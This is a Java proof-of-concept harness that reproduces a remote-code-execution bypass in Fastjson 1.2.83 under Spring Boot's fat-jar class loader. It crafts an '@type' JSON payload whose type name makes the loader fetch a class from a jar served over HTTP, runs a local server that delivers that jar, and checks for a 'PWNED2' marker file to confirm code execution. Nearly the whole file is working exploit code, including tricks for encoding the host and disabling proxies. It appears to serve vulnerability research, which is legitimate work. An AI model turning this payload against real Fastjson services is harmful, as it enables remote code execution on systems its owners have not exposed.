import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Stable local harness for Fastjson JsonType jar:http RCE under Spring Boot LaunchedURLClassLoader.
 *
 * Stability notes:
 * 1) Default host token is "localhost" (no dots, survives typeName '.' -> '/' rewrite,
 *    and usually bypasses macOS/system HTTP proxies).
 * 2) Classic integer-IP token 2130706433 remains available via -Dpoc.hostToken=2130706433
 *    but may be swallowed by system proxies unless proxy is disabled.
 * 3) This harness always clears JVM HTTP(S) proxy properties for the process.
 */
public class Test2 {
    private static final List<String> HITS = Collections.synchronizedList(new ArrayList<String>());
    private static final String HOST_TOKEN = System.getProperty("poc.hostToken", "localhost");
    private static final String ENTRY = System.getProperty("poc.entry", "POC");
    private static final String PWNED_NAME = System.getProperty("poc.pwnedFile", "PWNED2");
    private static final int PREFERRED_PORT = Integer.getInteger("poc.port", 18080);
    private static final int SERVER_WAIT_MS = Integer.getInteger("poc.serverWaitMs", 15000);

    private static final AtomicBoolean SERVER_READY = new AtomicBoolean(false);
    private static final AtomicReference<String> SERVER_ERROR = new AtomicReference<String>(null);

    private static int port = PREFERRED_PORT;
    private static String typeName;
    private static byte[] probeJar;
    private static volatile ServerSocket boundSocket;

    static {
        // Hard-disable proxies for deterministic local reproduction.
        System.setProperty("java.net.useSystemProxies", "false");
        System.clearProperty("http.proxyHost");
        System.clearProperty("http.proxyPort");
        System.clearProperty("https.proxyHost");
        System.clearProperty("https.proxyPort");
        System.clearProperty("ftp.proxyHost");
        System.clearProperty("socksProxyHost");
        System.setProperty("http.nonProxyHosts", "*");
        System.setProperty("sun.net.client.defaultConnectTimeout",
                System.getProperty("sun.net.client.defaultConnectTimeout", "3000"));
        System.setProperty("sun.net.client.defaultReadTimeout",
                System.getProperty("sun.net.client.defaultReadTimeout", "3000"));
    }

    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            usage();
            System.exit(2);
            return;
        }
        final String mode = args[0];
        final boolean expectPwn = mode.endsWith("-parse") || mode.endsWith("-load");

        File pwned = new File(PWNED_NAME);
        if (pwned.exists() && !pwned.delete()) {
            System.out.println("[setup] warning: could not delete old marker " + pwned.getAbsolutePath());
        }

        port = selectPort(PREFERRED_PORT);
        typeName = CraftProbe.typeName(HOST_TOKEN, port, ENTRY);
        File probeFile = new File(System.getProperty("poc.probeJar", "probe.jar")).getAbsoluteFile();
        probeJar = CraftProbe.writeProbeJar(probeFile, HOST_TOKEN, port, ENTRY, PWNED_NAME);

        System.out.println("[setup] hostToken=" + HOST_TOKEN);
        System.out.println("[setup] port=" + port);
        System.out.println("[setup] type=" + typeName);
        System.out.println("[setup] resource=" + typeName.replace('.', '/') + ".class");
        System.out.println("[setup] probe jar=" + probeFile + " (" + probeJar.length + " bytes)");
        System.out.println("[setup] java=" + System.getProperty("java.version")
                + " vendor=" + System.getProperty("java.vendor"));
        System.out.println("[setup] proxyHost=" + System.getProperty("http.proxyHost")
                + " nonProxyHosts=" + System.getProperty("http.nonProxyHosts"));

        CountDownLatch ready = new CountDownLatch(1);
        Thread server = startServer(ready);
        if (!ready.await(5, TimeUnit.SECONDS) || !SERVER_READY.get()) {
            System.out.println("[server] failed to become ready: " + SERVER_ERROR.get());
            System.exit(3);
            return;
        }
        Thread.sleep(30L);
        System.out.println("[server] ready on 127.0.0.1:" + port);

        // Warm-up: ensure classloader can resolve and fetch resource before parse.
        try {
            warmUpResourceFetch();
        } catch (Throwable t) {
            System.out.println("[warmup] failed: " + t);
        }

        try {
            if (!(mode.startsWith("sb27") || mode.startsWith("sb15"))) {
                usage();
                System.exit(2);
                return;
            }
            runWithLoader(mode);
        } catch (Throwable t) {
            System.out.println("[run] uncaught: " + t);
            t.printStackTrace(System.out);
        }

        Thread.sleep(250L);
        System.out.println("[server] requests: " + HITS.size());
        for (String hit : HITS) {
            System.out.println("[server] " + hit);
        }
        boolean pwn = pwned.exists();
        System.out.println("[pwned] " + PWNED_NAME + " exists: " + pwn);

        closeQuietly(boundSocket);
        server.interrupt();

        if (expectPwn) {
            if (pwn) {
                System.out.println("[result] SUCCESS");
                System.exit(0);
            }
            String jv = System.getProperty("java.specification.version", "");
            if (!"1.8".equals(jv) && !"8".equals(jv)) {
                System.out.println("[result] FAIL (full RCE expects JDK 8; current=" + jv + ")");
                System.exit(4);
            }
            System.out.println("[result] FAIL");
            System.exit(1);
        }
        System.exit(0);
    }

    private static ClassLoader newFatLoader() throws Exception {
        org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();
        URL[] urls = new URL[] {
                new URL("jar:" + fastjsonJar().toURI().toURL() + "!/"),
                classesDir().toURI().toURL()
        };
        System.out.println("[setup] fatjar urls = " + Arrays.toString(urls));
        ClassLoader parent = ClassLoader.getSystemClassLoader().getParent();
        ClassLoader fatClassLoader = new org.springframework.boot.loader.LaunchedURLClassLoader(urls, parent);
        Thread.currentThread().setContextClassLoader(fatClassLoader);
        System.out.println("[setup] fatClassLoader = " + fatClassLoader.getClass().getName());
        return fatClassLoader;
    }

    private static void warmUpResourceFetch() throws Exception {
        ClassLoader cl = newFatLoader();
        String resourceName = typeName.replace('.', '/') + ".class";
        URL url = cl.getResource(resourceName);
        System.out.println("[warmup] getResource=" + url);
        if (url == null) {
            throw new IllegalStateException("classloader cannot resolve resource " + resourceName
                    + " (check hostToken/proxy/port; prefer -Dpoc.hostToken=localhost and disabled proxies)");
        }
        InputStream in = url.openStream();
        try {
            byte[] b = new byte[4];
            int n = in.read(b);
            System.out.println("[warmup] read=" + n + " magic="
                    + (n >= 4 ? String.format("%02x%02x%02x%02x", b[0], b[1], b[2], b[3]) : "-"));
        } finally {
            in.close();
        }
    }

    private static void runWithLoader(String mode) throws Exception {
        ClassLoader fatClassLoader = newFatLoader();

        if (mode.endsWith("-direct")) {
            String resourceName = typeName.replace('.', '/') + ".class";
            System.out.println("[direct] getResource(\"" + resourceName + "\")");
            URL url = fatClassLoader.getResource(resourceName);
            System.out.println("[direct] -> URL = " + url);
            if (url != null) {
                InputStream input = url.openStream();
                try {
                    byte[] buffer = new byte[16];
                    int read = input.read(buffer);
                    System.out.println("[direct] -> openStream read " + read + " bytes, first4="
                            + (read >= 4
                            ? String.format("%02x %02x %02x %02x", buffer[0], buffer[1], buffer[2], buffer[3])
                            : "-"));
                } finally {
                    input.close();
                }
            }
            return;
        }

        if (mode.endsWith("-check")) {
            ParserConfig config = new ParserConfig();
            config.setDefaultClassLoader(fatClassLoader);
            try {
                Class<?> clazz = config.checkAutoType(typeName, null);
                System.out.println("[check] checkAutoType returned: " + clazz);
            } catch (Throwable throwable) {
                System.out.println("[check] checkAutoType threw: " + throwable);
            }
            return;
        }

        if (mode.endsWith("-load")) {
            try {
                Class<?> clazz = fatClassLoader.loadClass(typeName);
                System.out.println("[load] loadClass OK -> " + clazz + " loader=" + clazz.getClassLoader());
                Object instance = clazz.newInstance();
                System.out.println("[load] newInstance OK -> " + instance.getClass().getName());
            } catch (Throwable throwable) {
                System.out.println("[load] threw: " + throwable);
            }
            return;
        }

        if (mode.endsWith("-parse")) {
            ParserConfig global = ParserConfig.getGlobalInstance();
            global.setAutoTypeSupport(false);
            global.setDefaultClassLoader(fatClassLoader);
            String payload = "{\"" + "@type" + "\":\"" + typeName + "\",\"x\":1}";
            System.out.println("[parse] autoTypeSupport=" + global.isAutoTypeSupport());
            System.out.println("[parse] payload=" + payload);
            try {
                Object parsed = JSON.parse(payload);
                System.out.println("[parse] parsed -> " + describe(parsed));
            } catch (Throwable throwable) {
                System.out.println("[parse] threw: " + throwable);
                Thread.sleep(100L);
                try {
                    Object parsed = JSON.parse(payload);
                    System.out.println("[parse-retry] parsed -> " + describe(parsed));
                } catch (Throwable retry) {
                    System.out.println("[parse-retry] threw: " + retry);
                }
            }
            return;
        }

        if (mode.endsWith("-fatrun")) {
            Class<?> runner = Class.forName("FatRunner", true, fatClassLoader);
            Method main = runner.getMethod("main", String[].class);
            String payload = "{\"" + "@type" + "\":\"" + typeName + "\",\"x\":1}";
            main.invoke(null, (Object) new String[] { payload });
            return;
        }

        usage();
    }

    private static int selectPort(int preferred) throws Exception {
        String forced = System.getProperty("poc.port");
        if (forced != null && forced.trim().length() > 0) {
            int p = Integer.parseInt(forced.trim());
            ServerSocket ss = tryBind(p);
            ss.close();
            return p;
        }
        int[] candidates = new int[] { preferred, 18080, 18081, 18082, 18083, 18084, 18085, 0 };
        Exception last = null;
        for (int candidate : candidates) {
            try {
                ServerSocket ss = tryBind(candidate);
                int actual = ss.getLocalPort();
                ss.close();
                Thread.sleep(20L);
                return actual;
            } catch (Exception ex) {
                last = ex;
            }
        }
        throw new IllegalStateException("Unable to reserve a local port for probe HTTP server", last);
    }

    private static ServerSocket tryBind(int p) throws Exception {
        ServerSocket ss = new ServerSocket();
        ss.setReuseAddress(true);
        ss.bind(new InetSocketAddress(InetAddress.getByName("127.0.0.1"), p), 64);
        return ss;
    }

    private static Thread startServer(final CountDownLatch ready) {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                ServerSocket serverSocket = null;
                try {
                    serverSocket = tryBind(port);
                    boundSocket = serverSocket;
                    serverSocket.setSoTimeout(500);
                    SERVER_READY.set(true);
                    ready.countDown();
                    long end = System.currentTimeMillis() + SERVER_WAIT_MS;
                    while (System.currentTimeMillis() < end && !Thread.currentThread().isInterrupted()) {
                        try {
                            Socket socket = serverSocket.accept();
                            handleSequentially(socket);
                        } catch (SocketTimeoutException timeout) {
                            // loop
                        } catch (Exception exception) {
                            if (!Thread.currentThread().isInterrupted()) {
                                HITS.add("server accept error: " + exception);
                            }
                        }
                    }
                } catch (Exception exception) {
                    SERVER_ERROR.set(String.valueOf(exception));
                    SERVER_READY.set(false);
                    ready.countDown();
                } finally {
                    closeQuietly(serverSocket);
                }
            }
        }, "poc-http-jar");
        thread.setDaemon(true);
        thread.start();
        return thread;
    }

    private static void handleSequentially(Socket socket) {
        try {
            socket.setSoTimeout(5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
            String requestLine = reader.readLine();
            HITS.add("connection from " + socket.getRemoteSocketAddress() + " request: " + requestLine);
            String line;
            while ((line = reader.readLine()) != null && line.length() > 0) {
                // drain
            }
            OutputStream output = socket.getOutputStream();
            boolean wantProbe = requestLine != null && requestLine.contains("/probe");
            if (wantProbe && probeJar != null) {
                output.write(("HTTP/1.1 200 OK\r\nContent-Type: application/java-archive\r\nContent-Length: "
                        + probeJar.length + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
                output.write(probeJar);
                HITS.add("-> served probe.jar (200, " + probeJar.length + " bytes)");
            } else {
                byte[] body = "not found\n".getBytes("UTF-8");
                output.write(("HTTP/1.1 404 Not Found\r\nContent-Length: " + body.length
                        + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
                output.write(body);
                HITS.add("-> 404 for " + requestLine);
            }
            output.flush();
        } catch (Exception exception) {
            HITS.add("server handler error: " + exception);
        } finally {
            try {
                socket.close();
            } catch (Exception ignore) {
                // ignore
            }
        }
    }

    private static void closeQuietly(ServerSocket serverSocket) {
        if (serverSocket != null) {
            try {
                serverSocket.close();
            } catch (Exception ignore) {
                // ignore
            }
        }
    }

    private static File fastjsonJar() {
        return firstExisting(System.getProperty("poc.fastjsonJar"), "lib/fastjson-1.2.83.jar", "target/dependency/fastjson-1.2.83.jar");
    }

    private static File classesDir() {
        return firstExisting(System.getProperty("poc.classesDir"), "target/classes", ".");
    }

    private static File firstExisting(String explicit, String first, String second) {
        if (explicit != null && explicit.trim().length() > 0) {
            return requireFile(new File(explicit));
        }
        File file = new File(first);
        if (file.exists()) {
            return file.getAbsoluteFile();
        }
        return requireFile(new File(second));
    }

    private static File requireFile(File file) {
        if (!file.exists()) {
            throw new IllegalStateException("Required path not found: " + file.getAbsolutePath());
        }
        return file.getAbsoluteFile();
    }

    private static String describe(Object value) {
        if (value == null) {
            return "null";
        }
        return value.getClass().getName() + " " + value;
    }

    private static void usage() {
        System.out.println("Usage: java Test2 <sb27-direct|sb27-check|sb27-load|sb27-parse|sb27-fatrun|sb15-*>");
        System.out.println("Props: -Dpoc.hostToken=localhost|2130706433 -Dpoc.port=18080 -Dpoc.pwnedFile=PWNED2");
    }
}
